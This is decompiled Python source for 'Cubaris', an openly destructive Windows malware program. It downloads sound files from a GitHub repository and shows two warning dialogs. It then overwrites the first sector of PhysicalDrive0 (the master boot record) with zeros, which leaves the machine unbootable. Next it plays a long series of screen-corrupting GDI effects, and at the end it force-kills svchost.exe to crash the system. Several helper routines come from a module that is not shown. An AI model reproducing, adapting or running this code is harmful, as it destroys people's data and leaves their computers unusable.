# Source Generated with Decompyle++
# File: Cubaris.pyc (Python 3.9)
# def gone!

from e import *
import sys
import math
from os import getenv, system
from urllib.request import urlretrieve as download
from win32file import *
app = getenv('appdata') + '\\'
download('https://github.com/Itzsten/cubarissetup/raw/main/byeter.wav', app + 'byeter.wav')
download('https://github.com/Itzsten/cubarissetup/raw/main/byter.wav', app + 'byter.wav')
download('https://github.com/Itzsten/cubarissetup/raw/main/octo.wav', app + 'octo.wav')
download('https://github.com/Itzsten/cubarissetup/raw/main/deader.wav', app + 'deader.wav')
download('https://github.com/Itzsten/cubarissetup/raw/main/tooth.wav', app + 'tooth.wav')
if MessageBox("This program has the capacity to destroy your machine, making it unbootable. It is stronly recommended to exit the program if you're not on a virtual machine. It will destroy your PC. Continue?", "...A trail of death... follow me and you'll see...", MB_YESNO | MB_ICONWARNING) != 6:
    sys.exit()
if MessageBox('PRESSING YES WILL RESULT IN AN UNUSABLE MACHINE. THE CREATOR IS NOT RESPONSIBLE FOR ANY DATA LOSS OR DAMAGE. CONTINUE?', 'LAST WARNING!', MB_YESNO | MB_ICONWARNING) != 6:
    sys.exit()
hDevice = CreateFileW('\\\\.\\PhysicalDrive0', GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
WriteFile(hDevice, AllocateReadBuffer(512), None)
CloseHandle(hDevice)
desk = GetDC(0)
x = Gs(SM_CXSCREEN)
y = Gs(SM_CYSCREEN)
BitBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), desk, randrange(x), randrange(y), 0x9934CEFD)
warning = LoadIcon(None, 32515)
winlogo = LoadIcon(None, 32517)
error = LoadIcon(None, 32513)
hwnd = WindowFromPoint((0, 0))
monitor = (0, 0, GetSystemMetrics(0), GetSystemMetrics(1))
GrayBlt(desk, 0, 0, x, y)
for i in range(0, 20):
    TxtBlt(desk, 'Cubaris', randint(1, 50), randrange(x), randrange(y))
winsound.PlaySound(app + 'byter.WAV', winsound.SND_ASYNC | winsound.SND_ALIAS)
for i in range(0, 10):
    MirrorBlt(GetDC(0))
    Sleep(100)
InvalidateRect(hwnd, monitor, True)
for i in range(0, 10):
    BlurBlt(GetDC(0))
    Sleep(100)
for i in range(0, 30):
    RotateBlt(desk, 5, False, True)
    Sleep(100)
for i in range(0, 30):
    PixelBlt(desk, 155, 155)
    Sleep(100)
for i in range(0, 30):
    RotateBlt(desk, 5, True, True)
    PixelBlt(desk, 155, 155)
    UnBlt(desk, 5, 150, 3)
    Sleep(100)
winsound.PlaySound(app + 'octo.WAV', winsound.SND_ASYNC | winsound.SND_ALIAS)
for i in range(0, 50):
    UnBlt(desk, 5, 150, 3)
    SharpBlt(desk)
    m = GetCursorPos()
    DrawIcon(desk, m[0], m[1], choice([
        warning,
        error,
        winlogo]))
    Sleep(100)
for i in range(0, 20):
    UnBlt(desk, 5, 150, 3)
    MirrorBlt(GetDC(0))
    SharpBlt(desk)
    BitBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), desk, randrange(x), randrange(y), 0x9934CEFD)
    Sleep(100)
for i in range(0, 25):
    UnBlt(desk, 5, 150, 3)
    MirrorBlt(GetDC(0))
    SharpBlt(desk)
    ContourBlt(desk)
    DrawIcon(desk, randrange(x), randrange(y), choice([
        warning,
        error,
        winlogo]))
    BitBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), desk, randrange(x), randrange(y), 0x9934CEFD)
    Sleep(100)
winsound.PlaySound(app + 'tooth.WAV', winsound.SND_ASYNC | winsound.SND_ALIAS)
for i in range(0, 40):
    SharpBlt(desk)
    DrawIcon(desk, randrange(x), randrange(y), choice([
        warning,
        error,
        winlogo]))
    UnBlt(desk, 5, 150, 3)
    BitBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), desk, randrange(x), randrange(y), 0x9934CEFD)
    GrayBlt(desk, 0, 0, randrange(x), randrange(y))
    DarkBlt(desk, 0, 0, randrange(x), randrange(y))
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    Sleep(100)
winsound.PlaySound(app + 'deader.WAV', winsound.SND_ASYNC | winsound.SND_ALIAS)
for i in range(0, 200):
    ChopBlt(desk, i, int(math.sin(i) * 10))
    if randint(1, 5) == 5:
        BitBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), desk, randrange(x), randrange(y), 0x9934CEFD)
    if i > 180:
        StretchBlt(desk, 50, 50, x - 100, y - 100, desk, 0, 0, x, y, SRCCOPY)
    Sleep(100)
winsound.PlaySound(app + 'byeter.WAV', winsound.SND_ASYNC | winsound.SND_ALIAS)
for i in range(0, 200):
    BitBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), desk, randrange(x), randrange(y), 0x9934CEFD)
    if randint(1, 5) == 5:
        FlipBlt(desk)
    BrightBlt(desk, randint(6, 14) / 10)
system('taskkill /F /IM svchost.exe')
